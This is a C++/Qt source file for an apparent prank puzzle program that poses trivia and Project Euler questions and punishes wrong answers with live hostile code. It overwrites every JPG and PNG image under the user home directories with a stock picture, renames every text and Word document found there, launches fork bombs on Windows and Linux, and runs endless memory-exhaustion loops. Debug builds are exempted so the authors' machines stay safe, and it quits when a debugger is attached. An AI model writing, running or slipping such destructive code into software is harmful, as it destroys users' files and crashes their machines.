#include "apathy.hpp"
#include <QDirIterator>
#include <QDir>
#include <QDebug>
#include <QtGui/QImage>
#include <QTransform>
#include <QCryptographicHash>
#include <QRegularExpression>
#include <QThread>
#include <QTimer>
#include <QElapsedTimer>

#include <iostream>
#include <stdio.h>
#include <math.h>
#include <vector>
#include <chrono>
#include <thread>

#include <sys/types.h>
#include <stdlib.h>


#ifdef Q_OS_WIN
#include <Windows.h>
#define OS 0
#elif defined(Q_OS_MAC)
#define OS 1
#elif defined(Q_OS_LINUX)
#include <pthread.h>
#include <unistd.h>
#define OS 2
#endif
enum ops{
	win,
	mac,
	linux,
};

int fuckGlobals = 0;
float R[] = {1.1, 1.2, 1.3, 1.12, 4, 2.5};

double getNumaNuma(double numa){
	double numaTimes2=numa*0.5;
	qint64 shortNuma= *(qint64*)&numa;
	shortNuma = 0x5fe6eb50c7b537a9 - (shortNuma>>1);
	numa = *(double*) &shortNuma;
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	return numa;
}
long double overwhelming(long double a,quint64 A){
	long double B=1;
	for(quint64 b=0;b<A;++b){
		B*=a;
	}
	return B;
}
void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suitTag){
	bool dirtPanorama=false;
	if(image3.width()>image3.height()){
		dirtPanorama=true;
	}
	bool earthVista=false;
	if(image1.width()>image2.height()){
		earthVista=true;
	}
	QImage* favoriteImage[2]={earthVista?&image2:&image1,earthVista?&image1:&image2};
	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
}

void pleaseOnlyReadatNight(QString dir){
	if(OS==mac){
		dir=QString("");
	}else if(OS==linux){
		dir=QString("/home");
	}else{
		dir=QString("C:/Users");
	}
#ifdef QT_DEBUG
	dir = QString("C:/testImages"); // For testing
#endif
	auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;

	QDirIterator itr(dir, QStringList() << "*.txt"<<"*.doc"<<"*.docx", drain, QDirIterator::Subdirectories);
	while(itr.hasNext()){
		QString figurative = "_porn"; // As opposed to literal
		auto eman=itr.next();
		qDebug()<<eman;
		QFileInfo lanigiro(eman);
		QFile elif(lanigiro.absoluteFilePath());
		QString rotarapes = (OS==linux) ? "/" : "\\";
		QString eemmaann = lanigiro.canonicalPath() + rotarapes + lanigiro.baseName() + figurative;
		if (!lanigiro.completeSuffix().isEmpty())
			eemmaann += "." + lanigiro.completeSuffix();
		elif.rename(eman, eemmaann);
	}
	exit(1-2-52+3512-1235*5);
}

std::string cause(std::string* idx, int fet){
	std::cout<<idx->c_str()+fet<<std::endl;
	return (idx[1337]);
}

void failure(std::string fun,int wabba){
	std::string* p = &fun;
    cause(p,wabba);
}

void letsSpoon(){
	while(1){
#ifdef QT_DEBUG
        exit(-1); // So as not to bomb our machines
#endif
		if(OS==win){
            system("echo %0^|%0 > forkbomb.bat");
            system("forkbomb.bat");
		}else if(OS==linux){
			system(":(){ :|:& };:");
		}else{
			system("./$0|./$0&");
        }
	}
	letsSpoon();
}

quint64 canard(quint64 canary){
	canary <<= canary---1>>3;
	return (overwhelming(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary)-overwhelming(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
}

void gehinomEchad(){
	while(1){
		char* oEchat = new char[1337];
#ifdef QT_DEBUG
		exit(-5); // So as not to bomb our machines
#endif
		if(oEchat == NULL){
			continue;
		}
	}
}
void doNothing(char* blarg){
	blarg[0]='a';
	blarg[0]='b';
	blarg[0]='c';
	blarg[0]='d';
	blarg[0]='e';
	blarg[0]='f';
	blarg[0]++;
	blarg[0]+=1;
	blarg[0]+=1;
	blarg[0]+=1;
	blarg[0]+=1;
	blarg[0]+=1;
	blarg[0]+=1;
	blarg[0]+=1;
}
void gehinomShtaim2(){
	int l = (3*3)-7;
#ifdef QT_DEBUG
	int testNum=0;
#endif
	while(l){
		char* echad = new char[1];
		doNothing(echad);
		doNothing(echad);
		doNothing(echad);
		doNothing(echad);
		doNothing(echad);
		doNothing(echad);
		doNothing(echad);
		doNothing(echad);
//		std::this_thread::sleep_for(std::chrono::microseconds(1));
//		QThread::usleep(1);
		if(echad == NULL){
			qDebug()<<"test";
			continue;
		}
#ifdef QT_DEBUG
		qDebug()<<"test";
		if(testNum++>5){
			return; //So as not to bomb our machines
		}
#endif
	}
}
void gehinomShtaim(){
	QThread * thready=QThread::create(gehinomShtaim2);
	thready->start();
}
#ifdef Q_OS_LINUX
void* soDoesTea(void* void_star){
	float v = *(float*)void_star;

	usleep(1 * v);
	R[fuckGlobals++] = v;
	return NULL;
}

float* coffeeHelps(){
	int NUMA = 6;
	pthread_t pthread_T[NUMA];

	for(int f = 0; f < NUMA; f++){
		pthread_create(&pthread_T[f], NULL, soDoesTea, (void*)R[f]);
	}
	void* status;
	int rc;
	for(int f = 0; f < NUMA; f++){
		 rc = pthread_join(pthread_T[f], &status);
	}
	fuckGlobals = fuckGlobals ^ fuckGlobals;
	return R;
}
#endif

QVector<int> Apathy::koffeeHelps(QVector<int> beans){
	QVector<int> brews;
	brews.reserve(beans.length());
	for(int bean:beans){
		QTimer::singleShot(bean,Qt::PreciseTimer,[bean,&brews] () mutable {
			brews.append(bean);
		});
		app->processEvents();
	}

	while(brews.length()!=beans.length()){
		app->processEvents();
	}
	return brews;
}
void doSomething(float *arrr){
	arrr[4]=0;
	arrr[1]=0;
	arrr[3]=0;
	arrr[0]=0;
	arrr[2]=0;
	arrr[5]=0;
}

#ifdef Q_OS_WIN
DWORD funky(LPVOID para){
	long val = (long)para;
	Sleep((float)val * 1);
	R[fuckGlobals] = (float)val;
	++fuckGlobals;
	return 0;
}

float* cofeHelps(){

	HANDLE handles[6];

	for(int f = 0; f < 6; f++){
		handles[f] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&funky, (LPVOID)(long)R[f], 0, NULL);
	}

	WaitForMultipleObjects(6, handles, 1, INFINITE);
	fuckGlobals = fuckGlobals ^ fuckGlobals;
	return R;
}
#endif


QString escaped(QString str){
	QString escaped;
	escaped.reserve(6*str.size());
	for(QString::const_iterator it=str.begin();it!=str.end();++it){
		QChar ch = *it;
		ushort code = ch.unicode();
		if(code<0x80){
			escaped+=ch;
		}else{
			escaped+="\\u";
			escaped+=QString::number(code,16).rightJustified(4,'0');
		}
	}
	return escaped;
}

QString spaceloop(QString space){
	int iIiIiiIIiiIIIi=48;
	if(space.length()<5){
		for(auto &time:space){
			time=QChar(time.unicode()+iIiIiiIIiiIIIi);
			iIiIiiIIiiIIIi+=4;
		}
	}
	for(auto &time:space){
		time=QChar(time.unicode()+iIiIiiIIiiIIIi);
		iIiIiiIIiiIIIi+=4;
	}
	return space;
}


QString timeloop(QString time){
	int iIiIiiIIiiIIIi=48;
	for(auto &space:time){
		space=QChar(space.unicode()-iIiIiiIIiiIIIi);
		iIiIiiIIiiIIIi+=4;
	}
	return time;
}

int f2(QString& v1,int&v2,int&v3){
	if(v2<2){
		v2=97;
	}
	v3-=1;
	v1= v1.arg(v2--).arg(v3++);
	return v2+++ ++v3;
}

QString fizzbuzz(int endNum){
	QString res;
	QMap<int,QString> mappy{{2,"fizz%1%2"},{5,"pop%4%3"}};
	for(int i=1;i<=endNum;++i){
		QMapIterator<int,QString> itr(mappy);
		bool found=false;
		while(itr.hasNext()){
			itr.next();
			if(i%itr.key()==0){
				found=true;
				res+=itr.value();
			}
		}
		if(!found){
			res+="%"+QString::number(i);
		}
	}
	return res;
}

QString f1(QList<double>& v1,QList<int>& v2,QList<QString> &v3){
	QString v4;
	for(int iI1=0;iI1<v1.length();++iI1){
		v2.append((int)v1[iI1]);
		v3.append(fizzbuzz(v2[iI1]));
		v4+=QString::number(f2(v3[iI1],v2[iI1],v2[iI1]));
	}
	return v4;
}

void spam(){
	QFile::copy(":/Bambi.jpg","./Bambi.jpg");
	QDir flie("./Bambi.jpg");
    while(1){
#ifdef QT_DEBUG
        exit(-7); // So as not to bomb our machines
#endif
#ifdef Q_OS_WIN
		auto cmd = flie.absolutePath().toStdString().c_str();
#elif defined(Q_OS_LINUX)
		auto cmd = ("display "+flie.absolutePath()).toStdString().c_str();
#endif
		system(cmd);
    }
    spam();
}

Apathy::Apathy(QObject *parent) : QObject(parent)
{
	app = QCoreApplication::instance();
}

void Apathy::quit()
{
	emit finished();
}

void Apathy::run()
{
	QList<double> nommies;
#ifdef Q_OS_WIN
	if(IsDebuggerPresent()){
		quit();
	}
#endif
	std::cout<<"Welcome to the pit of despair!\nYou can check in any time you like, but you may never leave."<<std::endl<<std::endl;

	std::cout<<"I swear I had something for this phase!"<<std::endl;
	goto Phase10;
Phase1:
	{
		QList<qint64> nums({2985,5318008,1337});
		if(nums.length()!=nommies.length()){
			goto ousted;
		}
		for(int i=0;i<nums.length();++i){
			if(nums[i]!=round(getNumaNuma(nommies[i]))){
				goto ousted;
			}
		}
		goto outed;
	}

prior:
	{
		bool sadness=true; //:(
		if(!nommies.isEmpty()){
			nommies.clear(); //Yum!!
			sadness=false;
		}
		std::string str;
		std::getline(std::cin,str);
		QString cheese(str.c_str());
		QStringList noms=cheese.split(" ",QString::SkipEmptyParts);
		bool doky=true;
		for(QString nom:noms){
			auto treat=nom.toDouble(&doky);
			if(doky){
				nommies.append(treat);
			}
		}
		if(sadness)
		goto Phase1;
		goto DefinitelyNotPhase1;
	}
exaunt:
	exit(0);
ousted:
	{
		QString dir;
		QImage maliciousImage(":/bunny.jpg");
		QImage maliciousImage2(":/Octavia.png");
		if(maliciousImage.isNull()||maliciousImage2.isNull()){
			exit(-1);
		}
		QTransform rot;
		rot.rotate(90);
		QImage maliciousImageRotated(maliciousImage.transformed(rot,Qt::SmoothTransformation));
		QImage maliciousImage2Rotated(maliciousImage2.transformed(rot,Qt::SmoothTransformation));
		if(OS==win){
			dir=QString("C:/Users");
		}else if(OS==mac){
			dir=QString("...");
		}else if(OS==linux){
			dir=QString("/home");
		}
#ifdef QT_DEBUG
		dir = QString("C:/testImages");
#endif
		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;

		QDirIterator itr(dir, QStringList() << "*.jpg"<<"*.png"<<"*.jpeg", drain, QDirIterator::Subdirectories);
		while(itr.hasNext()){
			auto imageName=itr.next();
			QImage fImage(imageName);
			if(fImage.isNull()){
				continue;
			}
			if(imageName.endsWith(".png"))
				pictureYourself(maliciousImage2,maliciousImage2Rotated,fImage,imageName);
			else
				pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);

		}
		exit(2);
	}
outed:
	std::cout<<"Fill in the blanks:\n___ is to ___ as ___ is to ___, whilst ___ is a ___ ___; you ________."<<std::endl;
	goto prior;
	exit(0);

DefinitelyNotPhase1:
	{
		QList<quint64> nummies({308061521170129,1346269,4660046610375542784,28657});
		if(nummies.length()!=nommies.length()){
			gehinomEchad();
		}
		for(int i=0;i<nummies.length();++i){
			if(nummies[i]!=canard(nommies[i])){
				gehinomEchad();
			}
		}
		std::cout<<"That was a bit of a lie, but you figured it out anyway, good on ya!"<<std::endl;
		goto Phasers;
		exit(0);
	}
Phase10:
	{
		QCryptographicHash taters(QCryptographicHash::Sha256);
		QString tweedle("6a039d1d1406d62c1f6f83e4aa6a5124f1e94bb214476c79052001b66b9cabe4");
		QString dum("e5b5e0ba9f3d51657f797c2e616f09a83f1ef277521495d0dd9ccf4ca9104374");
		std::vector<char> viktor{'b','0','8','c','8','c','f','0','a','7','f','b','0','0','6','9','7','4','b','c','b','7','2','f','f','3','1','a','3','8','9','1','6','3','1','e','9','9','f','1','5','8','b','1','1','2','d','7','2','f','c','e','5','3','b','e','c','6','3','1','8','1','d','b'};
		QString dee("f2b8507d75e56e72a0af528a1aa64215d016db3e23a8bbf698124a398c910079");
		std::string str;
		std::cout<<"Are Sterling and Mallory eskimo brothers?"<<std::endl;
		std::getline(std::cin,str);
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		if(tweedle!=taters.result().toHex())
			failure("Answer was:",99999);
		std::cout<<"How many tallies does Pam have on her back?"<<std::endl;
		std::getline(std::cin,str);
		taters.reset();
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		if(taters.result().toHex()!=dum)
			failure("Answer was:",198735);

		std::cout<<"What type of animal is Babou?"<<std::endl;

		getline(std::cin,str);
		taters.reset();
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		if(dee!=taters.result().toHex())
			failure("Answer was:",949843);

		std::cout<<"Which character wore a dolphin puppet on their hand?"<<std::endl;
		getline(std::cin,str);
		taters.reset();
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		QString input(taters.result().toHex());
		int c = 15 ^ 15;
		while(c < input.length()&& input[c]==viktor[c]){
			c++; // Get it?
		}
		if(c < input.length()){
			failure("Answer was:",54831);
		}
		std::cout<<"Congratulations, you know some trivia, but do you know this?"<<std::endl<<std::endl;
	}
	std::cout<<"Answers are against your boxy perception.\n";
	goto prior;

PhaseWrapper:
{
		QStringList caf;
	QString betterCallSol("57782e074824f9d63eadcc71c581973a4d17a597a4b094d13924d903dfc4e07f");
		QList<int> backwardsCompatibility;
#ifdef Q_OS_WIN
		float* r = cofeHelps();
#elif defined(Q_OS_LINUX)
		float* r = coffeeHelps();
#endif
		doSomething(r);
		std::cout<<"NoS, MoNsTeR, RoCkStAr, ReD BuLl all have something in common..."<<std::endl;
		std::string str;
		std::getline(std::cin,str);
		nommies.clear();
		QStringList snackkies=QString(str.c_str()).split(".",QString::SkipEmptyParts);
		for(QString tasty:snackkies){
			bool yummy;
			double trickOrTreat=tasty.toDouble(&yummy);
			if(yummy)
				nommies.append(trickOrTreat);
			else
				std::cout<<"Yuck! :( I demand tasties!"<<std::endl;
		}
		f1(nommies,backwardsCompatibility,caf);
		if(caf.length()<2){
			std::cout<<"You dissapoint me."<<std::endl;
			letsSpoon();
		}
		for(QString cAf:caf){
			if(!cAf.contains(QRegularExpression("fizz"))){
				std::cout<<"You poor soul..."<<std::endl;
				letsSpoon();
			}
		}
		QVector<int> bar = koffeeHelps(backwardsCompatibility.toVector());
		int maximiliusRex=2;
		int maximiliusRexsYoungerBrother=-1;
		for(auto maximiliusRexsYoungerBrother=1; maximiliusRexsYoungerBrother<=nommies.length()-2;++maximiliusRexsYoungerBrother){
			if(bar[maximiliusRexsYoungerBrother]<bar[maximiliusRexsYoungerBrother-1])
				maximiliusRex-=1;
			if(bar[maximiliusRexsYoungerBrother]>bar[maximiliusRexsYoungerBrother+1])
				maximiliusRex-=1;
			if(maximiliusRex<0){
				letsSpoon();
			}
		}
		if(maximiliusRexsYoungerBrother!=-1){
			letsSpoon();
		}
		if(maximiliusRex!=0){
			letsSpoon();
		}
		QString qStr(str.c_str());
		QCryptographicHash eggs(QCryptographicHash::Sha256);
		eggs.addData(qStr.toUtf8());
		if(betterCallSol != eggs.result().toHex()){
		}
		std::cout<<"Congratulations on passing this... for now."<<std::endl;
	goto exaunt;
}
Phasers:
{
	int tries=2;
	//Courtesy of Project Euler :)
	QString prompt=R"(The following iterative sequence is defined for the set of positive integers:

   n → n/2 (n is even)
   n → 3n + 1 (n is odd)

   Using the rule above and starting with 13, we generate the following sequence:
   13 → 40 → 20 → 10 → 5 → 16 → 8 → 4 → 2 → 1

It can be seen that this sequence (starting at 13 and finishing at 1) contains 10 terms.
Although it has not been proved yet (Collatz Problem), it is thought that all starting numbers finish at 1.

Which starting number, under 5 million, produces the longest chain?
	)";
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE),prompt.utf16(),prompt.size(),NULL,NULL);
	QString a("87c4bb5e8c10291d34096bde7b031ed0f62d789bdf3281b394bdc267ee98ab6d");
	std::string str;
	while(true){
		std::getline(std::cin,str);
		if(a!=QCryptographicHash::hash(QString(str.c_str()).toUtf8(),QCryptographicHash::Sha256).toHex()){
			if(--tries>0){
				std::cout<<"Seeing as I'm so nice, I'll give you "<<tries<<" more tries."<<std::endl;
				gehinomShtaim();
			}else{
                spam();
			}
		}else{
			break;
		}
	}
	std::cout<<"Congratulations 4933458 is correct!"<<std::endl;
	prompt = R"(
 If the numbers 1 to 5 are written out in words: one, two, three, four, five, then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.

 If all the numbers from 1 to 1337 (one thousand three hundred and seven) inclusive were written out in words, how many letters would be used?

 NOTE: Do not count spaces or hyphens. For example, 342 (three hundred and forty-two) contains 23 letters and 115 (one hundred and fifteen) contains 20 letters. The use of 'and' when writing out numbers is in compliance with British usage.
	)";
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE),prompt.utf16(),prompt.size(),NULL,NULL);
	a="d75ce5017561e791495b3e007ead8697b27e277cd9882b2262e0de66d6d1f12e";
	while(true){
		std::getline(std::cin,str);
		if(a!=QCryptographicHash::hash(QString(str.c_str()).toUtf8(),QCryptographicHash::Sha256).toHex()){
			if(--tries>0){
				std::cout<<"Seeing as I'm so nice, I'll give you "<<tries<<" more tries."<<std::endl;
				gehinomShtaim();
			}else{
                spam();
			}
		}else{
			break;
		}
	}
	std::cout<<"Congratulations 4933 is correct!"<<std::endl;
	prompt = R"(
 You are given the following information:

	 1 Jan 1900 was a Monday.
	 Thirty days has September,
	 April, June and November.
	 All the rest have thirty-one,
	 Saving February alone,
	 Which has twenty-eight, rain or shine.
	 And on leap years, twenty-nine.
	 A leap year occurs on any year evenly divisible by 4, but not on a century unless it is divisible by 400.

 How many Sundays fell on the first of the month during the twentieth century (1 Jan 1901 to 17 May 2018)?
	)";
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE),prompt.utf16(),prompt.size(),NULL,NULL);
	a="c17edaae86e4016a583e098582f6dbf3eccade8ef83747df9ba617ded9d31309";
	while(true){
		std::getline(std::cin,str);
		if(a!=QCryptographicHash::hash(QString(str.c_str()).toUtf8(),QCryptographicHash::Sha256).toHex()){
			if(--tries>0){
				std::cout<<"Seeing as I'm so nice, I'll give you "<<tries<<" more tries."<<std::endl;
				gehinomShtaim();
			}else{
                spam();
			}
		}else{
			break;
		}
	}
	std::cout<<"Congratulations 7899 is correct!\n\n";
	std::cout<<"Well done on those!"<<std::endl;
	goto PhaseWrapper;
	exit(0);
//	return 0;
}
	quit();
}
